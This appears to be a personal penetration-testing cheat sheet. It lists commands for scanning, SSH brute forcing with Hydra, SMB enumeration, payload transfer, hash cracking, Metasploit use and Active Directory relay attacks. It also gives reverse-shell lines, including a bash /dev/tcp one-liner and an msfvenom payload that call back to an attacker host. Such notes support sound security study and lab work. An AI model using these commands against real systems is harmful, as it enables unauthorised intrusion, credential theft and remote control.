# Links
## Resources
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
## Tools
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CrackStation](https://crackstation.net/)
- https://www.revshells.com/
## Downloads
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/releases)
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/releases)
# Scanning
## Nikto
```
nikto -h http://<ip>
```
## Nessus
```
systemctl start nessusd
```
https://localhost:8834
## Nmap
```
nmap -T4 -p- <ip>
```
```
nmap -T4 -A -p <port1>,<port2> <ip>
```
`-sS` TCP SYN
`-sU` UDP Scan
## Directories
### Gobuster
```
gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### Fuff
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<ip>/FUZZ
```
### DirBuster
```
dirbuster&
```
## Subdomains
### Fuff
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://<ip> -H "HOST: FUZZ.<domain>.com" [-fc <code>] [-fs <size>]
```
### AMASS
```
amass enum -d <domain>.com [-v] [-o <filename>]
```
## DNS
### DNSrecon
```
dnsrecon -r 127.0.0.0/24 -n <ip>
```
# Ports & Services
## 22 - SSH
### Bruteforcing with Hydra
```
hydra -l <username> -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip>:22 [-t 4] [-V]
```
## 139/445 - SMB
### Smbclient
List file shares:
```
smbclient -L \\\\<ip>\\
```
Connect to a specific share:
```
smbclient \\\\<ip>\\<share>
```
# File Transfer
## Python Server
Start python server in current directory:
```
python3 -m http.server 8000
```
Linux:
```
wget http://<ip>:8000/linpeas.sh
```
Windows:
```
certutil.exe -urlcache -f http://<ip>:8000/winpeas.exe winpeas.exe
```
## Secure Copy Protocol
Local -> Remote:
```
scp /<local-origin-path> <username>@<remote-host>:/<remote-destination-path>
```
Remote -> Local:
```
scp <username>@<origin-host>:/<remote-origin-path> /<local-destination-path>
```
# Reverse Shells
## MSFvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename>.exe
```
## Bash
```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
## PHP
[PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
# Netcat Shell Stabilization
Use `python`, `python2` or `python3` depending on the system:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
export TERM=xterm
```

Press `Ctrl + Z` to background the netcat shell

```
stty raw -echo; fg
```
# Hash Cracking
## John the Ripper
## Hydra
Find modules:
```
hashcat --help | grep NTLM
```
https://hashcat.net/wiki/doku.php?id=example_hashes
Crack the hash:
```
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
```
`--show` if hash has already been cracked
`--force` for problem with running it in a VM
`-r` add rule to mutate the wordlist
`-O` to optimize performance when running it on a base system
# Metasploit
Start Metasploit:
```
msfconsole
```
Search for module:
```
search smb scanner
```
Use module:
```
use 24
OR
use auxiliary/scanner/smb/smb_version
```
Show info:
```
info
```
Show options:
```
options
```
Set option:
```
set RHOSTS 192.168.161.130
```
Run the exploit:
```
run
```
Set different payload:
```
set payload linux/x86
```
**Note:** Type the beginning of the payload and then press TAB to display all options.
# Active Directory
## Responder
```
sudo responder -I tun0 -dP
```
`tun0`  on a VPN
`eth0` in a network
### Configure Settings
```
sudo nano /etc/responder/Responder.conf
```
### SMB Relay Scan
```
nmap --script=smb2-security-mode.nse -p445 <ip>/24 -Pn
```
### ntlmrelayx
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
`-i` to spawn an interactive shell
`-c`   run commands with `-c "whoami"`

# Privilege Escalation Checklist
coming soon...
